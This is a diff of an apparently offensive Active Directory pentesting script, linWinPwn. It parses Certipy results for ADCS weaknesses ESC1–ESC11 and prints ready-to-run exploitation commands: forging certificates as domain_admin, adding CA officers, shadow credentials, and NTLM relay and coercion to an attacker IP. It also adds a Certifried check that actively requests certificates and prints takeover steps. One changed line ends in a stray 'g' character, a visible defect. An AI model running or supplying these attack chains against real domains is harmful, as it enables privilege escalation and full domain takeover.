@@ -90,7 +90,7 @@ print_banner () {
       | || | | | |\ V  V / | | | | |  __/ \ V  V /| | | | 
       |_||_|_| |_| \_/\_/  |_|_| |_|_|     \_/\_/ |_| |_| 
 
-      ${BLUE}linWinPwn: ${CYAN}version 0.8.5 ${NC}
+      ${BLUE}linWinPwn: ${CYAN}version 0.8.6 ${NC}
       https://github.com/lefayjey/linWinPwn
       ${BLUE}Author: ${CYAN}lefayjey${NC}
       ${BLUE}Inspired by: ${CYAN}S3cur3Th1sSh1t's WinPwn${NC}
@@ -158,8 +158,8 @@ done
 set -- "${args[@]}"
 
 run_command () {
-    echo "$(date +%Y-%m-%d\ %H:%M:%S); $1" >> $command_log
-    $1
+    echo "$(date +%Y-%m-%d\ %H:%M:%S); $@" >> $command_log
+    $@
 }
 
 prepare (){
@@ -827,7 +827,6 @@ certi_py_enum () {
             run_command "${certi_py} list ${argument_certi_py} --dc-ip ${dc_ip} --vuln --enabled" 2>&1 | tee ${output_dir}/DomainRecon/ADCS/certi.py_vulntemplates_output_${dc_domain}.txt
         fi
     fi
-    adcs_vuln_parse
     echo -e ""
 }
 
@@ -846,7 +845,7 @@ certipy_enum () {
                 cd ${output_dir}/DomainRecon/ADCS
                 if [ "${ldaps_bool}" == true ]; then ldaps_param=""; else ldaps_param="-scheme ldap"; fi
                 run_command "${certipy} find ${argument_certipy} -dc-ip ${dc_ip} -ns ${dc_ip} -dns-tcp ${ldaps_param}" 2>&1 | tee ${output_dir}/DomainRecon/ADCS/certipy_output_${dc_domain}.txt
-                run_command "${certipy} find ${argument_certipy} -dc-ip ${dc_ip} -ns ${dc_ip} -dns-tcp ${ldaps_param} -vulnerable -stdout -hide-admins" 2>&1 >> ${output_dir}/DomainRecon/ADCS/certipy_vulnerable_output_${dc_domain}.txt
+                run_command "${certipy} find ${argument_certipy} -dc-ip ${dc_ip} -ns ${dc_ip} -dns-tcp ${ldaps_param} -vulnerable -json -output vuln_${dc_domain} -stdout -hide-admins" 2>&1 >> ${output_dir}/DomainRecon/ADCS/certipy_vulnerable_output_${dc_domain}.txt
                 cd ${current_dir}
             fi
         fi
@@ -900,153 +899,141 @@ adcs_vuln_parse (){
         if [ "${ldaps_bool}" == true ]; then ldaps_param="--port 636"; else ldaps_param=""; fi
         run_command "${netexec} ${ne_verbose} ldap ${target} ${argument_ne[@]} ${ldaps_param} -M adcs --kdcHost ${kdc}.${dc_domain} --log ${output_dir}/DomainRecon/ADCS/ne_adcs_output_${dc_domain}.txt" 2>&1
     fi
-
-    pki_server=$(/bin/cat ${output_dir}/DomainRecon/ADCS/ne_adcs_output_${dc_domain}.txt 2>/dev/null| grep "Found PKI Enrollment Server" | cut -d ":" -f 4| cut -d " " -f 2 | head -n 1)
-    pki_ca=$(/bin/cat ${output_dir}/DomainRecon/ADCS/ne_adcs_output_${dc_domain}.txt 2>/dev/null| grep "Found CN" | cut -d ":" -f 4 | cut -d " " -f 2 | head -n 1)
  
-    esc1_vuln_certi_py=$(grep -a "ESC1 - " "${output_dir}/DomainRecon/ADCS/certi.py_vulntemplates_output_${dc_domain}.txt" -B 3 2>/dev/null | grep Name | sed "s/Name: //g" | sort -u)
-    esc1_vuln_certipy=$(grep -h -P '^(?!.*Name).*(?i:ESC1)' "${output_dir}/DomainRecon/ADCS/certipy_vulnerable_output_${dc_domain}.txt" -B 30 2>/dev/null | grep "Template Name" | cut -d ":" -f 2 | cut -d " " -f 2)
-    esc1_vuln=$(echo -e "${esc1_vuln_certi_py}\\n${esc1_vuln_certipy}" | sort -u)
+    esc1_vuln=$(jq -r '."Certificate Templates"[] | select (."[!] Vulnerabilities"."ESC1" and (."[!] Vulnerabilities"[] | contains("Admins") | not) and ."Enabled" == true)."Template Name"' "${output_dir}/DomainRecon/ADCS/vuln_${dc_domain}_Certipy.json" 2>/dev/null | sort -u)
     if [[ ! -z $esc1_vuln ]]; then
-            echo -e "${GREEN}[+] Templates vulnerable to ESC1 potentially found! Follow steps below for exploitation:${NC}"
-            echo -e "${CYAN}1. Request certificate with an arbitrary UPN (Administrator or DC or both):${NC}"
-            for vulntemp in $esc1_vuln; do
-                echo -e "${YELLOW}# ${vulntemp} certificate template${NC}"
-                echo -e "${certipy} req ${argument_certipy} -ca PKI_CA -target PKI_Server -template ${vulntemp} -upn administrator@${dc_domain} -dns ${dc_FQDN} -dc-ip ${dc_ip}"
-            done
-            echo -e "${CYAN}2. Authenticate using pfx of Administrator or DC:${NC}"
-            echo -e "${certipy} auth -pfx administrator_dc.pfx -dc-ip ${dc_ip}"
-    fi
-
-    esc2_3_vuln_certi_py=$(grep -a "ESC2 - \|ESC3\.1 - \|ESC3\.2 - " "${output_dir}/DomainRecon/ADCS/certi.py_vulntemplates_output_${dc_domain}.txt" -B 3 2>/dev/null | grep Name | sed "s/Name: //g" | sort -u)
-    esc2_3_vuln_certipy=$(grep -h -P '^(?!.*Name).*(?i:(ESC2|ESC3))' "${output_dir}/DomainRecon/ADCS/certipy_vulnerable_output_${dc_domain}.txt" -B 30 2>/dev/null| grep "Template Name" | cut -d ":" -f 2 | cut -d " " -f 2)
-    esc2_3_vuln=$(echo -e "${esc2_3_vuln_certi_py}\\n${esc2_3_vuln_certipy}" | sort -u)
-    if [[ ! -z $esc2_3_vuln ]]; then
-            echo -e "${GREEN}[+] Templates vulnerable to ESC2 or ESC3 potentially found! Follow steps below for exploitation:${NC}"
-            echo -e "${CYAN}1. Request a certificate based on the vulnerable template:${NC}"
-            for vulntemp in $esc2_3_vuln; do
-                echo -e "${YELLOW}# ${vulntemp} certificate template${NC}"
-                echo -e "${certipy} req ${argument_certipy} -ca PKI_CA -target PKI_Server -template ${vulntemp} -dc-ip ${dc_ip}"
-            done
-            echo -e "${CYAN}2. Use the Certificate Request Agent certificate to request a certificate on behalf of the administrator:${NC}"
-            echo -e "${certipy} req ${argument_certipy} -ca PKI_CA -target PKI_Server -template User -on-behalf-of $(echo $dc_domain | cut -d "." -f 1)\\Administrator -pfx ${user}.pfx -dc-ip ${dc_ip}"
-            echo -e "${CYAN}3. Authenticate using pfx of Administrator:${NC}"
-            echo -e "${certipy} auth -pfx administrator.pfx -dc-ip ${dc_ip}"
-    fi
-
-    esc4_vuln_certi_py=$(grep -a "ESC4 - " "${output_dir}/DomainRecon/ADCS/certi.py_vulntemplates_output_${dc_domain}.txt" -B 3 2>/dev/null | grep Name | sed "s/Name: //g" | sort -u)
-    esc4_vuln_certipy=$(grep -h -P '^(?!.*Name).*(?i:ESC4)' "${output_dir}/DomainRecon/ADCS/certipy_vulnerable_output_${dc_domain}.txt" -B 30 2>/dev/null| grep "Template Name" | cut -d ":" -f 2 | cut -d " " -f 2)
-    esc4_vuln=$(echo -e "${esc4_vuln_certi_py}\\n${esc4_vuln_certipy}" | sort -u)
-    if [[ ! -z $esc4_vuln ]]; then
-            echo -e "${GREEN}[+] Templates vulnerable to ESC4 potentially found! Follow steps below for exploitation:${NC}"
-            echo -e "${CYAN}1. Make the template vulnerable to ESC1:${NC}"
-            for vulntemp in $esc4_vuln; do
-                echo -e "${YELLOW}# ${vulntemp} certificate template${NC}"
-                echo -e "${certipy} template ${argument_certipy} -template ${vulntemp} -save-old -dc-ip ${dc_ip}"
-            done
-            echo -e "${CYAN}2. Request certificate with an arbitrary UPN (domain_admin or DC or both):${NC}"
-            for vulntemp in $esc4_vuln; do
-                echo -e "${YELLOW}# ${vulntemp} certificate template${NC}"
-                echo -e "${certipy} req ${argument_certipy} -ca PKI_CA -target PKI_Server -template ${vulntemp} -upn domain_admin@${dc_domain} -dns ${dc_FQDN} -dc-ip ${dc_ip}"
-            done
-            echo -e "${CYAN}3. Restore configuration of vulnerable template:${NC}"
-            for vulntemp in $esc4_vuln; do
-                echo -e "${YELLOW}# ${vulntemp} certificate template${NC}"
-                echo -e "${certipy} template ${argument_certipy} -template ${vulntemp} -configuration ${vulntemp}.json"
-            done
-            echo -e "${CYAN}4. Authenticate using pfx of domain_admin or DC:${NC}"
-            echo -e "${certipy} auth -pfx administrator_dc.pfx -dc-ip ${dc_ip}"
-    fi
-
-    esc6_vuln_certi_py=$(grep -a "ESC6 - " "${output_dir}/DomainRecon/ADCS/certi.py_vulntemplates_output_${dc_domain}.txt" -B 3 2>/dev/null | grep Name | sed "s/Name: //g" | sort -u)
-    esc6_vuln_certipy=$(grep -h -P '^(?!.*Name).*(?i:ESC6)' "${output_dir}/DomainRecon/ADCS/certipy_vulnerable_output_${dc_domain}.txt" -B 30 2>/dev/null| grep "CA Name" | cut -d ":" -f 2 | cut -d " " -f 2)
-    esc6_vuln=$(echo -e "${esc6_vuln_certi_py}\\n${esc6_vuln_certipy}" | sort -u)
-    if [[ ! -z $esc6_vuln ]]; then
-            echo -e "${GREEN}[+] ESC6 vulnerability potentially found! Follow steps below for exploitation:${NC}"
+        echo -e "${GREEN}[+] Templates vulnerable to ESC1 potentially found! Follow steps below for exploitation:${NC}"
+        for vulntemp in $esc1_vuln; do
+            echo -e "${YELLOW}# ${vulntemp} certificate template${NC}"
             echo -e "${CYAN}1. Request certificate with an arbitrary UPN (domain_admin or DC or both):${NC}"
-            echo -e "${certipy} req ${argument_certipy} -ca PKI_CA -target PKI_Server -template User -upn domain_admin@${dc_domain}"
+            echo -e "${certipy} req ${argument_certipy} -ca PKI_CA -target PKI_Server -template ${vulntemp} -upn domain_admin@${dc_domain} -dns ${dc_FQDN} -dc-ip ${dc_ip}"
+            echo -e "${CYAN}2. Authenticate using pfx of domain_admin or DC:${NC}"
+            echo -e "${certipy} auth -pfx domain_admin_dc.pfx -dc-ip ${dc_ip}"
+        done
+    fi
+
+    esc2_3_vuln=$(jq -r '."Certificate Templates"[] | select ((."[!] Vulnerabilities"."ESC2" or ."[!] Vulnerabilities"."ESC3") and (."[!] Vulnerabilities"[] | contains("Admins") | not) and ."Enabled" == true)."Template Name"' "${output_dir}/DomainRecon/ADCS/vuln_${dc_domain}_Certipy.json" 2>/dev/null | sort -u)
+    if [[ ! -z $esc2_3_vuln ]]; then
+        echo -e "${GREEN}[+] Templates vulnerable to ESC2 or ESC3 potentially found! Follow steps below for exploitation:${NC}"
+        for vulntemp in $esc2_3_vuln; do
+            echo -e "${YELLOW}# ${vulntemp} certificate template${NC}"
+            echo -e "${CYAN}1. Request a certificate based on the vulnerable template:${NC}"
+            echo -e "${certipy} req ${argument_certipy} -ca PKI_CA -target PKI_Server -template ${vulntemp} -dc-ip ${dc_ip}"
+            echo -e "${CYAN}2. Use the Certificate Request Agent certificate to request a certificate on behalf of the domain_admin:${NC}"
+            echo -e "${certipy} req ${argument_certipy} -ca PKI_CA -target PKI_Server -template User -on-behalf-of $(echo $dc_domain | cut -d "." -f 1)\\domain_admin -pfx ${user}.pfx -dc-ip ${dc_ip}"
+            echo -e "${CYAN}3. Authenticate using pfx of domain_admin:${NC}"
+            echo -e "${certipy} auth -pfx domain_admin.pfx -dc-ip ${dc_ip}"
+        done
+    fi
+
+    esc4_vuln=$(jq -r '."Certificate Templates"[] | select (."[!] Vulnerabilities"."ESC4" and (."[!] Vulnerabilities"[] | contains("Admins") | not) and ."Enabled" == true)."Template Name"' "${output_dir}/DomainRecon/ADCS/vuln_${dc_domain}_Certipy.json" 2>/dev/null | sort -u)
+    if [[ ! -z $esc4_vuln ]]; then
+        echo -e "${GREEN}[+] Templates vulnerable to ESC4 potentially found! Follow steps below for exploitation:${NC}"
+        for vulntemp in $esc4_vuln; do
+            echo -e "${YELLOW}# ${vulntemp} certificate template${NC}"
+            echo -e "${CYAN}1. Make the template vulnerable to ESC1:${NC}"
+            echo -e "${certipy} template ${argument_certipy} -template ${vulntemp} -save-old -dc-ip ${dc_ip}"
+            echo -e "${CYAN}2. Request certificate with an arbitrary UPN (domain_admin or DC or both):${NC}"
+            echo -e "${certipy} req ${argument_certipy} -ca PKI_CA -target PKI_Server -template ${vulntemp} -upn domain_admin@${dc_domain} -dns ${dc_FQDN} -dc-ip ${dc_ip}"
+            echo -e "${CYAN}3. Restore configuration of vulnerable template:${NC}"
+            echo -e "${certipy} template ${argument_certipy} -template ${vulntemp} -configuration ${vulntemp}.json"
+            echo -e "${CYAN}4. Authenticate using pfx of domain_admin or DC:${NC}"
+            echo -e "${certipy} auth -pfx domain_admin_dc.pfx -dc-ip ${dc_ip}"
+        done
+    fi
+
+    esc6_vuln=$(jq -r '."Certificate Authorities"[] | select (."[!] Vulnerabilities"."ESC6") | ."CA Name"' "${output_dir}/DomainRecon/ADCS/vuln_${dc_domain}_Certipy.json" 2>/dev/null | sort -u)
+    if [[ ! -z $esc6_vuln ]]; then
+        echo -e "${GREEN}[+] ESC6 vulnerability potentially found! Follow steps below for exploitation:${NC}"
+        for vulntemp in $esc6_vuln; do
+            echo -e "${YELLOW}# ${vulntemp} certificate authority${NC}"
+            echo -e "${CYAN}1. Request certificate with an arbitrary UPN (domain_admin or DC or both):${NC}"
+            echo -e "${certipy} req ${argument_certipy} -ca $vulntemp -target PKI_Server -template User -upn domain_admin@${dc_domain}"
             echo -e "${CYAN}2. Authenticate using pfx of domain_admin:${NC}"
             echo -e "${certipy} auth -pfx administrator.pfx -dc-ip ${dc_ip}"
+        done
     fi
 
-    esc7_vuln_certi_py=$(grep -a "ESC7 - " "${output_dir}/DomainRecon/ADCS/certi.py_vulntemplates_output_${dc_domain}.txt" -B 3 2>/dev/null | grep Name | sed "s/Name: //g" | sort -u)
-    esc7_vuln_certipy=$(grep -h -P '^(?!.*Name).*(?i:ESC7)' "${output_dir}/DomainRecon/ADCS/certipy_vulnerable_output_${dc_domain}.txt" -B 30 2>/dev/null| grep "CA Name" | cut -d ":" -f 2 | cut -d " " -f 2)
-    esc7_vuln=$(echo -e "${esc7_vuln_certi_py}\\n${esc7_vuln_certipy}" | sort -u)
+    esc7_vuln=$(jq -r '."Certificate Authorities"[] | select (."[!] Vulnerabilities"."ESC7") | ."CA Name"' "${output_dir}/DomainRecon/ADCS/vuln_${dc_domain}_Certipy.json" 2>/dev/null | sort -u)
     if [[ ! -z $esc7_vuln ]]; then
-            echo -e "${GREEN}[+] ESC7 vulnerability potentially found! Follow steps below for exploitation:${NC}"
+        echo -e "${GREEN}[+] ESC7 vulnerability potentially found! Follow steps below for exploitation:${NC}"
+        for vulntemp in $esc7_vuln; do
+            echo -e "${YELLOW}# ${vulntemp} certificate authority${NC}"
             echo -e "${CYAN}1. Add a new officer:${NC}"
-            echo -e "${certipy} ca ${argument_certipy} -ca PKI_CA -add-officer "${user}" -dc-ip ${dc_ip}"
+            echo -e "${certipy} ca ${argument_certipy} -ca $vulntemp -add-officer "${user}" -dc-ip ${dc_ip}"
             echo -e "${CYAN}2. Enable SubCA certificate template:${NC}"
-            echo -e "${certipy} ca ${argument_certipy} --ca PKI_CA -enable-template SubCA -dc-ip ${dc_ip}"
+            echo -e "${certipy} ca ${argument_certipy} --ca $vulntemp -enable-template SubCA -dc-ip ${dc_ip}"
             echo -e "${CYAN}3. Save the private key and note down the request ID:${NC}"
-            echo -e "${certipy} req ${argument_certipy} -ca PKI_CA -target PKI_Server -template SubCA -upn domain_admin@${dc_domain} -dc-ip ${dc_ip}"
+            echo -e "${certipy} req ${argument_certipy} -ca $vulntemp -target PKI_Server -template SubCA -upn domain_admin@${dc_domain} -dc-ip ${dc_ip}"
             echo -e "${CYAN}4. Issue a failed request (need ManageCA and ManageCertificates rights for a failed request):${NC}"
-            echo -e "${certipy} ca ${argument_certipy} -ca PKI_CA -issue-request <request_ID> -dc-ip ${dc_ip}"
+            echo -e "${certipy} ca ${argument_certipy} -ca $vulntemp -issue-request <request_ID> -dc-ip ${dc_ip}"
             echo -e "${CYAN}5. Retrieve an issued certificate:${NC}"
-            echo -e "${certipy} req ${argument_certipy} -ca PKI_CA -target PKI_Server -retrieve <request_ID> -dc-ip ${dc_ip}"
+            echo -e "${certipy} req ${argument_certipy} -ca $vulntemp -target PKI_Server -retrieve <request_ID> -dc-ip ${dc_ip}"
             echo -e "${CYAN}6. Authenticate using pfx of domain_admin:${NC}"
             echo -e "${certipy} auth -pfx domain_admin.pfx -dc-ip ${dc_ip}"
+        done
     fi
 
-    esc8_vuln_certi_py=$(grep -a "ESC8 - " "${output_dir}/DomainRecon/ADCS/certi.py_vulntemplates_output_${dc_domain}.txt" -B 3 2>/dev/null | grep Name | sed "s/Name: //g" | sort -u)
-    esc8_vuln_certipy=$(grep -h -P '^(?!.*Name).*(?i:ESC8)' "${output_dir}/DomainRecon/ADCS/certipy_vulnerable_output_${dc_domain}.txt" -B 30 2>/dev/null| grep "CA Name" | cut -d ":" -f 2 | cut -d " " -f 2)
-    esc8_vuln=$(echo -e "${esc8_vuln_certi_py}\\n${esc8_vuln_certipy}" | sort -u)
+    esc8_vuln=$(jq -r '."Certificate Authorities"[] | select (."[!] Vulnerabilities"."ESC8") | ."CA Name"' "${output_dir}/DomainRecon/ADCS/vuln_${dc_domain}_Certipy.json" 2>/dev/null | sort -u)
     if [[ ! -z $esc8_vuln ]]; then
-            echo -e "${GREEN}[+] ESC8 vulnerability potentially found! Follow steps below for exploitation:${NC}"
+        echo -e "${GREEN}[+] ESC8 vulnerability potentially found! Follow steps below for exploitation:${NC}"
+        for vulntemp in $esc8_vuln; do
+            echo -e "${YELLOW}# ${vulntemp} certificate authority${NC}"
             echo -e "${CYAN}1. Start the relay server:${NC}"
-            echo -e "${certipy} relay -ca ${pki_ca} -dc-ip ${dc_ip}"
+            echo -e "${certipy} relay -ca ${vulntemp} -dc-ip ${dc_ip}"
             echo -e "${CYAN}2. Coerce Domain Controler:${NC}"
             echo -e "${coercer} coerce ${argument_coercer} -t ${i} -l $attacker_IP --dc-ip $dc_ip"
+        done
     fi
 
-    esc9_vuln_certi_py=$(grep -a "ESC9 - " "${output_dir}/DomainRecon/ADCS/certi.py_vulntemplates_output_${dc_domain}.txt" -B 3 2>/dev/null | grep Name | sed "s/Name: //g" | sort -u)
-    esc9_vuln_certipy=$(grep -h -P '^(?!.*Name).*(?i:ESC9)' "${output_dir}/DomainRecon/ADCS/certipy_vulnerable_output_${dc_domain}.txt" -B 30 2>/dev/null| grep "Template Name" | cut -d ":" -f 2 | cut -d " " -f 2)
-    esc9_vuln=$(echo -e "${esc9_vuln_certi_py}\\n${esc9_vuln_certipy}" | sort -u)
+    esc9_vuln=$(jq -r '."Certificate Templates"[] | select (."[!] Vulnerabilities"."ESC9" and (."[!] Vulnerabilities"[] | contains("Admins") | not) and ."Enabled" == true)."Template Name"' "${output_dir}/DomainRecon/ADCS/vuln_${dc_domain}_Certipy.json" 2>/dev/null | sort -u)
     if [[ ! -z $esc9_vuln ]]; then
-            echo -e "${GREEN}[+] ESC9 vulnerability potentially found! Follow steps below for exploitation:${NC}"
+        echo -e "${GREEN}[+] ESC9 vulnerability potentially found! Follow steps below for exploitation:${NC}"
+        for vulntemp in $esc9_vuln; do
+            echo -e "${YELLOW}# ${vulntemp} certificate template${NC}"
             echo -e "${CYAN}1. Retrieve second_user's NT hash Shadow Credentials (GenericWrite against second_user):${NC}"
-            echo -e "${certipy} shadow auto ${argument_certipy} -account <second_user>-dc-ip ${dc_ip}"
-            echo -e "${CYAN}2. Change userPrincipalName of user2 to domain_admin:${NC}"
+            echo -e "${certipy} shadow auto ${argument_certipy} -account <second_user> -dc-ip ${dc_ip}"
+            echo -e "${CYAN}2. Change userPrincipalName of second_user to domain_admin:${NC}"
             echo -e "${certipy} account update ${argument_certipy} -user <second_user> -upn domain_admin@${dc_domain} -dc-ip ${dc_ip}"
             echo -e "${CYAN}3. Request vulnerable certificate as second_user:${NC}"
-            for vulntemp in $esc9_vuln; do
-                echo -e "${YELLOW}# ${vulntemp} certificate template${NC}"
-                echo -e "${certipy} req -username <second_user>@${dc_domain} -hash <second_user_hash> -target PKI_Server -ca PKI_CA -template ${vulntemp} -dc-ip ${dc_ip}"
-            done
+            echo -e "${certipy} req -username <second_user>@${dc_domain} -hash <second_user_hash> -target PKI_Server -ca PKI_CA -template ${vulntemp} -dc-ip ${dc_ip}"
             echo -e "${CYAN}4. Change second_user's UPN back:${NC}"
             echo -e "${certipy} account update ${argument_certipy} -user <second_user> -upn <second_user>@${dc_domain} -dc-ip ${dc_ip}"
             echo -e "${CYAN}5. Authenticate using pfx of domain_admin:${NC}"
             echo -e "${certipy} auth -pfx domain_admin.pfx -dc-ip ${dc_ip}"
+        done
     fi
 
-    esc10_vuln_certi_py=$(grep -a "ESC10 - " "${output_dir}/DomainRecon/ADCS/certi.py_vulntemplates_output_${dc_domain}.txt" -B 3 2>/dev/null | grep Name | sed "s/Name: //g" | sort -u)
-    esc10_vuln_certipy=$(grep -h -P '^(?!.*Name).*(?i:ESC10)' "${output_dir}/DomainRecon/ADCS/certipy_vulnerable_output_${dc_domain}.txt" -B 30 2>/dev/null| grep "CA Name" | cut -d ":" -f 2 | cut -d " " -f 2)
-    esc10_vuln=$(echo -e "${esc10_vuln_certi_py}\\n${esc10_vuln_certipy}" | sort -u)
+    esc10_vuln=$(jq -r '."Certificate Authorities"[] | select (."[!] Vulnerabilities"."ESC10") | ."CA Name"' "${output_dir}/DomainRecon/ADCS/vuln_${dc_domain}_Certipy.json" 2>/dev/null | sort -u)
     if [[ ! -z $esc10_vuln ]]; then
-            echo -e "${GREEN}[+] ESC10 vulnerability potentially found! Follow steps below for exploitation:${NC}"
+        echo -e "${GREEN}[+] ESC10 vulnerability potentially found! Follow steps below for exploitation:${NC}"
+        for vulntemp in $esc10_vuln; do
+            echo -e "${YELLOW}# ${vulntemp} certificate authority${NC}"
             echo -e "${CYAN}1. Retrieve second_user's NT hash Shadow Credentials (GenericWrite against second_user):${NC}"
-            echo -e "${certipy} shadow auto ${argument_certipy} -account <second_user>-dc-ip ${dc_ip}"
+            echo -e "${certipy} shadow auto ${argument_certipy} -account <second_user> -dc-ip ${dc_ip}"
             echo -e "${CYAN}2. Change userPrincipalName of user2 to domain_admin or DC:${NC}"
             echo -e "${certipy} account update ${argument_certipy} -user <second_user> -upn domain_admin@${dc_domain} -dc-ip ${dc_ip}"
             echo -e "${certipy} account update ${argument_certipy} -user <second_user> -upn ${dc_NETBIOS}\\\$@${dc_domain} -dc-ip ${dc_ip}"
             echo -e "${CYAN}3. Request certificate permitting client authentication as second_user:${NC}"
-            echo -e "${certipy} req -username <second_user>@${dc_domain} -hash <second_user_hash> -ca PKI_CA -template User -dc-ip ${dc_ip}"
+            echo -e "${certipy} req -username <second_user>@${dc_domain} -hash <second_user_hash> -ca $vulntemp -template User -dc-ip ${dc_ip}"
             echo -e "${CYAN}4. Change second_user's UPN back:${NC}"
             echo -e "${certipy} account update ${argument_certipy} -user <second_user> -upn <second_user>@${dc_domain} -dc-ip ${dc_ip}"
             echo -e "${CYAN}5. Authenticate using pfx of domain_admin or DC:${NC}"
             echo -e "${certipy} auth -pfx domain_admin.pfx -dc-ip ${dc_ip}"
-            echo -e "${certipy} auth -pfx ${dc_NETBIOS}.pfx -dc-ip ${dc_ip}"
+            echo -e "${certipy} auth -pfx ${dc_NETBIOS}.pfx -dc-ip ${dc_ip}"g
+        done
     fi
 
-    esc11_vuln_certi_py=$(grep -a "ESC11 - " "${output_dir}/DomainRecon/ADCS/certi.py_vulntemplates_output_${dc_domain}.txt" -B 3 2>/dev/null | grep Name | sed "s/Name: //g" | sort -u)
-    esc11_vuln_certipy=$(grep -h -P '^(?!.*Name).*(?i:ESC11)' "${output_dir}/DomainRecon/ADCS/certipy_vulnerable_output_${dc_domain}.txt" -B 30 2>/dev/null| grep "CA Name" | cut -d ":" -f 2 | cut -d " " -f 2)
-    esc11_vuln=$(echo -e "${esc11_vuln_certi_py}\\n${esc11_vuln_certipy}" | sort -u)
+    esc11_vuln=$(jq -r '."Certificate Authorities"[] | select (."[!] Vulnerabilities"."ESC11") | ."CA Name"' "${output_dir}/DomainRecon/ADCS/vuln_${dc_domain}_Certipy.json" 2>/dev/null | sort -u)
     if [[ ! -z $esc11_vuln ]]; then
-            echo -e "${GREEN}[+] ESC11 vulnerability potentially found! Follow steps below for exploitation:${NC}"
+        echo -e "${GREEN}[+] ESC11 vulnerability potentially found! Follow steps below for exploitation:${NC}"
+        for vulntemp in $esc11_vuln; do
+            echo -e "${YELLOW}# ${vulntemp} certificate authority${NC}"
             echo -e "${CYAN}1. Start the relay server (relay to the Certificate Authority and request certificate via ICPR):${NC}"
-            echo -e "ntlmrelayx.py -t rpc://PKI_Server -rpc-mode ICPR -icpr-ca-name PKI_CA -smb2support"
+            echo -e "ntlmrelayx.py -t rpc://PKI_Server -rpc-mode ICPR -icpr-ca-name $vulntemp -smb2support"
             echo -e "${CYAN}2. Coerce Domain Controler:${NC}"
             echo -e "${coercer} coerce ${argument_coercer} -t ${i} -l $attacker_IP --dc-ip $dc_ip"
+        done
     fi
 }
 
@@ -1633,6 +1620,43 @@ coercer_check () {
     echo -e ""
 }
 
+certifried_check () {
+    if [[ ! -f "${certipy}" ]] ; then
+        echo -e "${RED}[-] Please verify the installation of certipy${NC}"
+    else
+        echo -e "${BLUE}[*] Certifried Vulnerability Check${NC}"
+        if [ "${nullsess_bool}" == true ] ; then
+            echo -e "${PURPLE}[-] certipy requires credentials${NC}"
+        else
+            if [ ! -f "${output_dir}/DomainRecon/ADCS/ne_adcs_output_${dc_domain}.txt" ]; then
+                run_command "${netexec} ${ne_verbose} ldap ${target} ${argument_ne[@]} ${ldaps_param} -M adcs --kdcHost ${kdc}.${dc_domain} --log ${output_dir}/DomainRecon/ADCS/ne_adcs_output_${dc_domain}.txt" 2>&1
+            fi
+            pki_servers=$(/bin/cat ${output_dir}/DomainRecon/ADCS/ne_adcs_output_${dc_domain}.txt 2>/dev/null| grep "Found PKI Enrollment Server" | cut -d ":" -f 4 | cut -d " " -f 2 | awk '!x[$0]++')
+            pki_cas=$(/bin/cat ${output_dir}/DomainRecon/ADCS/ne_adcs_output_${dc_domain}.txt 2>/dev/null| grep "Found CN" | cut -d ":" -f 4 | cut -d " " -f 2 | awk '!x[$0]++')
+            current_dir=$(pwd)
+            cd ${output_dir}/Credentials
+            i=0
+            for pki_server in $pki_servers; do
+                i=$((i + 1))
+                run_command "${certipy} req ${argument_certipy} -dc-ip ${dc_ip} -ns ${dc_ip} -dns-tcp ${ldaps_param} -target ${pki_server} -ca $(echo -e $pki_cas | sed -n ${i}p) -template User" 2>&1 | tee ${output_dir}/Vulnerabilities/certifried_check_${pki_server}_${dc_domain}.txt
+                if ! grep -q "Certificate object SID is" ${output_dir}/Vulnerabilities/certifried_check_${pki_server}_${dc_domain}.txt 2>/dev/null; then
+                    echo -e "${GREEN}[+] ${pki_server} potentially vulnerable to Certifried! Follow steps below for exploitation:${NC}"
+                    echo -e "${CYAN}1. Create a new computer account with a dNSHostName property of a Domain Controller:${NC}"
+                    echo -e "${certipy} account create ${argument_certipy} -user NEW_COMPUTER_NAME -pass NEW_COMPUTER_PASS -dc-ip $dc_ip -dns $dc_NETBIOS.$dc_domain"
+                    echo -e "${CYAN}2. Obtain a certificate for the new computer:${NC}"
+                    echo -e "${certipy} req -u NEW_COMPUTER_NAME\$@${dc_domain} -p NEW_COMPUTER_PASS -dc-ip $dc_ip -target $pki_server -ca $(echo -e $pki_cas | sed -n ${i}p) -template Machine"
+                    echo -e "${CYAN}3. Authenticate using pfx:${NC}"
+                    echo -e "${certipy} auth -pfx ${dc_NETBIOS}.pfx -username ${dc_NETBIOS}\$ -dc-ip ${dc_ip}"
+                    echo -e "${CYAN}4. Delete the created computer:${NC}"
+                    echo -e "${certipy} account delete ${argument_certipy} -dc-ip ${dc_ip} -user NEW_COMPUTER_NAME "                 
+                fi
+            done
+            cd ${current_dir}
+        fi
+    fi
+    echo -e ""
+}
+
 #MSSQL scan
 mssql_enum () {
     if [ ! -f "${windapsearch}" ] || [ ! -f "${impacket_GetUserSPNs}" ]; then
@@ -2051,6 +2075,7 @@ vuln_checks () {
     runasppl_check
     rpcdump_check
     coercer_check
+    certifried_check
 }
 
 print_info () {
@@ -2424,6 +2449,7 @@ vulns_menu () {
     echo -e "13) runasppl check using netexec"
     echo -e "14) RPC Dump and check for interesting protocols"
     echo -e "15) Coercer RPC scan"
+    echo -e "16) Certifried check"
     echo -e "99) Back"
 
     read -p "> " option_selected </dev/tty
@@ -2511,6 +2537,11 @@ vulns_menu () {
 
         15)
         coercer_check
+        vulns_menu
+        ;;
+
+        16)
+        certifried_check
         vulns_menu
         ;;
 
